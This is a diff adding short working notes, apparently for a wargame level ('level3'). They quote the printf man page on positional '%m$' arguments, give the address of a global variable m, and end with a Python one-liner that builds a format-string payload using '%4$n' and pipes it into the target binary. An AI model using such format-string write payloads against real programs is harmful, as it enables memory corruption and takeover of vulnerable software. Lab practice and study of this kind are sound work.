@@ -1,0 +1,38 @@
+we need to change global variable m
+
+ The overall syntax of a conversion specification is:
+
+    %[$][flags][width][.precision][length modifier]conversion
+
+    The arguments must correspond properly (after type promotion)
+    with the conversion specifier.  By default, the arguments are
+    used in the order given, where each '*' (see Field width and
+    Precision below) and each conversion specifier asks for the next
+    argument (and it is an error if insufficiently many arguments are
+    given).  One can also specify explicitly which argument is taken,
+    at each place where an argument is required, by writing "%m$"
+    instead of '%' and "*m$" instead of '*', where the decimal
+    integer m denotes the position in the argument list of the
+    desired argument, indexed starting from 1.  Thus,
+
+        printf("%*d", width, num);
+
+    and
+
+        printf("%2$*1$d", width, num);
+
+    are equivalent.  The second style allows repeated references to
+    the same argument.  The C99 standard does not include the style
+    using '$', which comes from the Single UNIX Specification.  If
+    the style using '$' is used, it must be used throughout for all
+    conversions taking an argument and all width and precision
+    arguments, but it may be mixed with "%%" formats, which do not
+    consume an argument.  There may be no gaps in the numbers of
+    arguments specified using '$'; for example, if arguments 1 and 3
+    are specified, argument 2 must also be specified somewhere in the
+    format string.
+    
+    address of M is 0x804988c
+
+    python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
+    cat /tmp/exploit - | ./level3
